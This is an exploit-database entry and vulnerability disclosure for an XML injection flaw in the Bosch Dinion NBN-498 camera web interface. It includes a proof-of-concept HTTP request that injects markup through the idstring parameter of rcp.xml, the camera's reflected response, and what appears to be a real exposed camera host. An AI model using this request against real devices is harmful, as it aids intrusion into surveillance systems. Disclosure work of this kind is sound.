description: The web interface in Bosch Security Systems NBN-498 Dinion2X Day/Night IP Cameras with H.264 Firmware 4.54.0026 allows remote attackers to conduct XML injection attacks via the idstring parameter to rcp.xml.

38369.exploit title: Bosch Security Systems Dinion NBN-498 - Web Interface XML Injection
38369.content:
"b'# Exploit Title: Bosch Security Systems - XML Injection - Dinion NBN-498 Web Interface\\r\
\\r\
# Date: 01/09/2015\\r\
\\r\
# Exploit Author: neom22\\r\
\\r\
# Vendor Homepage: http://us.boschsecurity.com\\r\
\\r\
# Data Sheet: http://resource.boschsecurity.us/documents/Data_sheet_enUS_9007201286798987.pdf\\r\
\\r\
# Version: Hardware Firmware 4.54.0026 - Web Interface version is unknown\\r\
\\r\
# Tested on: Windows 8.1 - Firefox 40.0.3\\r\
\\r\
# CVE : CVE-2015-6970 (To be published)\\r\
\\r\
\\r\
#################################################\\r\
#                                                                                                        #\\r\
#    Discovered by neom22                                                           #\\r\
#    23 - 09 - 2015                                                                           #\\r\
#                                                                                                        #\\r\
#################################################\\r\
#\\r\
#\\r\
Bosch Security Systems - Dinion NBN-498 - Web Interface (Live Feed and Administration)\\r\
#\\r\
#\\r\
Vulnerability Discovery: 10/09/2015\\r\
Vendor Contact: 17/09/2015 (no answer)\\r\
Published: 24/09/2015\\r\
#\\r\
#\\r\
\\r\
Description: \\r\
-----------------------------------------------------------------\\r\
The Dinion2x IP Day/Night camera is a high-performance, smart\\r\
surveillance color camera. It incorporates 20-bit digital signal\\r\
processing and a wide dynamic range sensor for outstanding\\r\
picture performance under all lighting conditons.\\r\
The camera uses H.264 compression technology to give clear\\r\
images while reducing bandwidth and storage requirements. It\\r\
is also ONVIF compliant to improve compatibility during system\\r\
integration.\\r\
The camera operates as a network video server and transmits\\r\
video and control signals over data networks, such as Ethernet\\r\
LANs and the Internet.\\r\
-----------------------------------------------------------------\\r\
\\r\
Useful Links:\\r\
\\r\
Data Sheet: http://resource.boschsecurity.us/documents/Data_sheet_enUS_9007201286798987.pdf\\r\
Documentation: http://resource.boschsecurity.us/documents/Installation_Manual_enUS_2032074379.pdf\\r\
Product: \\r\
\\r\
http://us.boschsecurity.com/en/us_product/products/video/ipcameras/sdfixedcameras/nbn498dinion2xdaynightipc/nbn498\\r\
\\r\
dinion2xdaynightipc_608\\r\
-----------------------------------------------------------------\\r\
\\r\
XML Parameter Injection POC\\r\
\\r\
_-Request-_\\r\
\\r\
GET /rcp.xml?idstring=<string>injection</string> HTTP/1.1\\r\
Host: postoipiranga.dyndns-ip.com:10004\\r\
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0\\r\
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\
Accept-Language: en-US,en;q=0.5\\r\
Accept-Encoding: gzip, deflate\\r\
Cookie: HcsoB=60cd4a687de94857\\r\
Connection: keep-alive\\r\
\\r\
_-Response-_\\r\
\\r\
HTTP/1.1 200 OK\\r\
Server: VCS-VideoJet-Webserver\\r\
Connection: keep-alive\\r\
Content-Type: text/xml\\r\
Accept-Ranges: bytes\\r\
Content-Length: 359\\r\
Expires: 0\\r\
Cache-Control: no-cache\\r\
Set-Cookie: HcsoB=60cd4a687de94857; path=/;\\r\
\\r\
<rcp>\\r\
    <command>\\r\
        <hex>0x0000</hex>\\r\
        <dec>       0</dec>\\r\
    </command>\\r\
    <type>T_DWORD</type>\\r\
    <direction>READ</direction>\\r\
    <num>0</num>\\r\
    <idstring><string>injection</string></idstring>\\r\
    <payload></payload>\\r\
<cltid>0x478e</cltid><sessionid>0x00000000</sessionid><auth>1</auth><protocol>TCP</protocol>    <result>\\r\
            <err>0x40</err>\\r\
    </result>\\r\
</rcp>\\r\
 \ \  \    \ \    \ \  \    \ \   '"

solution_1.type: Exploit, Third Party Advisory, VDB Entry
